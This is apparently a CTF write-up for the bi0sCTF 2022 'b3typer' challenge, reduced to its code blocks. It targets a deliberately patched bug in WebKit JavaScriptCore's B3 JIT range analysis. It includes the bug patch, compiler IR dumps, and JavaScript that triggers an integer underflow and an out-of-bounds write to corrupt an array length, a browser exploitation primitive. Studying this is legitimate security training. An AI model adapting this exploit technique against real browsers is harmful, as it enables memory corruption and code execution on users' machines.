# b3typer – bi0sCTF 2022

> 原文: https://www.ctfiot.com/92870.html
> ID: 92870


```
1
2
3
4
5
6
7
8
9
git clone https://github.com/WebKit/WebKit.git
cd WebKit
git checkout 645b9044d2369e3b083b171da517a2440bb4fa18
git apply debug.patch
Tools/gtk/install-dependencies
Tools/Scripts/build-webkit --jsc-only --debug
cd WebKitBuild/Debug/bin

./jsc --useConcurrentJIT=false
1
2
3
4
5
6
7
8
9
10
template<typename T>
 static IntRange rangeForMask(T mask)
 {
 if (!(mask + 1))
 return top<T>();
 if (mask < 0)
 return IntRange(INT_MIN & mask, mask & INT_MAX);
- return IntRange(0, mask);
+ return IntRange(1, mask);
 }
1
2
3
4
5
6
7
8
9
IntRange rangeFor(Value* value, unsigned timeToLive = 5)
{
 // .....
 case BitAnd:
 if (value->child(1)->hasInt())
 return IntRange::
rangeForMask(value->child(1)->asInt(), value->type());
 break;
 // ......
}
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
void reduceValueStrength()
{
 // ...
 case CheckAdd: {
 // ...
 IntRange leftRange = rangeFor(m_value->child(0));
 IntRange rightRange = rangeFor(m_value->child(1));
 if (!leftRange.couldOverflowAdd(rightRange, m_value->type())) {
 replaceWithNewValue(
 m_proc.add<Value>(Add, m_value->origin(), m_value->child(0), m_value->child(1)));
 break;
 }
 break;
 }
 // ...
}
1
2
3
4
5
6
7
8
template<typename T>
bool couldOverflowAdd(const IntRange& other)
{
 return sumOverflows<T>(m_min, other.m_min)
 || sumOverflows<T>(m_min, other.m_max)
 || sumOverflows<T>(m_max, other.m_min)
 || sumOverflows<T>(m_max, other.m_max);
}
1
2
3
4
5
void lower() {
 // ...
 case CheckAdd:
 opcode = opcodeForType(BranchAdd32, BranchAdd64, m_value->type());
 // ...
1
2
3
4
5
6
function hax(a) {
 let b = a | 0;
 let c = b & 2;
 let d = c + -1;
 return d;
}
1
2
3
4
let b = a | 0;
let c = b & 2;
let d = c + -1;
let e = d + -0x80000000;
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
function hax(a) {
 let b = a | 0;
 let c = b & 2;
 let d = c + -1;
 let e = d + -0x80000000;
 return e;
}
function main() {
 for(let i = 0; i < 100000; ++i) {
 hax(2);
 }
}
noInline(hax);
noDFG(main);
noFTL(main);
main();
1
2
3
4
5
6
7
8
9
B3 after reduceDoubleToFloat, before reduceStrength:
...
b3 Int32 b@35 = CheckAdd(b@33:
WarmAny, $-1(b@34):
WarmAny, b@33:
ColdAny, generator = 0x7f551e032750, earlyClobbered = [], lateClobbered = [], usedRegisters = [], ExitsSideways|Reads:
Top, D@41)
b3 Int32 b@37 = CheckAdd(b@35:
WarmAny, $-2147483648(b@36):
WarmAny, b@35:
ColdAny, generator = 0x7f551e0327a0, earlyClobbered = [], lateClobbered = [], usedRegisters = [], ExitsSideways|Reads:
Top, D@45)
...
B3 after reduceStrength, before eliminateCommonSubexpressions:
...
b3 Int32 b@23 = Add(b@33, $2147483647(b@37), D@45)
...
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
function hax(arr, a) {
 // Force 32-bit integer
 let b = a | 0;
 // Setup bug trigger
 // compiler assumes range is [1, 2], actually [0, 2]
 let c = b & 2;
 // Trigger rangeFor
 // assumed range [0, 1], actual [-1, 1]
 let idx = c - 1;

 // Check will always pass
 if (idx < arr.length) {
 // Trigger integer underflow, idx will become INT_MAX
 // Compiler assumes this case only triggers for value 0, no underflow check
 if (idx < 1) {
 idx += -0x80000000;
 }
 // idx assumed to be < arr.length, only subtraction occurs
 if (idx > 0) {
 arr[idx] = 0x1337;
 }
 }
}
1
2
3
4
5
6
7
8
// idx is -1 here, passes the check
if (idx < 1) {
 idx += -0x80000000;
}
// idx is 0x7fffffff here, passes the check
if (idx > 2) {
 idx += -0x7fffffff;
}
1
2
3
4
5
6
JSCell Header
Butterfly pointer
Inline property 1
Inline property 2
...
...
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
@@ -285,4 +287,16 @@ JSC_DEFINE_HOST_FUNCTION(reflectObjectSetPrototypeOf, (JSGlobalObject* globalObj
 return JSValue::
encode(jsBoolean(didSetPrototype));
 }

+JSC_DEFINE_HOST_FUNCTION(reflectObjectStrid, (JSGlobalObject* globalObject, CallFrame* callFrame))
+{
+ VM& vm = globalObject->vm();
+ auto scope = DECLARE_THROW_SCOPE(vm);
+
+ JSValue target = callFrame->argument(0);
+ if (!target.isObject())
+ return JSValue::
encode(throwTypeError(globalObject, scope, "Reflect.strid requires the first argument be an object"_s));
+ JSObject* targetObject = asObject(target);
+ RELEASE_AND_RETURN(scope, JSValue::
encode(jsNumber(targetObject->structureID().bits())));
+}
+
1
fake butterfly -> target butterfly -> ?
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
function hax(arr, a) {
 // Force 32-bit integer
 let b = a | 0;
 // Setup bug trigger
 // compiler assumes range is [1, 2], actually [0, 2]
 let c = b & 2;
 // Trigger rangeFor
 // assumed range [0, 1], actual [-1, 1]
 let idx = c - 1;

 // Check will always pass
 if (idx < arr.length) {
 // Trigger integer underflow, idx will become INT_MAX
 // Compiler assumes this case only triggers for value 0, no underflow check
 if (idx < 1) {
 idx += -0x80000000;
 }
 // Use this to set oob write index
 if (idx > 2) {
 idx += -0x7ffffffa;
 }
 // idx assumed to be < arr.length, only subtraction occurs so upper bound is unchecked
 // Overwrite length of array to 0x1337
 if (idx > 0) {
 arr[idx] = 0x1337;
 }
 }
}

noInline(hax);

var arr = new Array(5);
var dblarr = new Array(5);
var objarr = new Array(5);
arr.fill(1);
dblarr.fill(13.37);
objarr.fill({});

function trigger() {
 for (var i = 0; i < 100000; ++i) {
 hax(arr, 2);
 }
 hax(arr, 1);

}
```
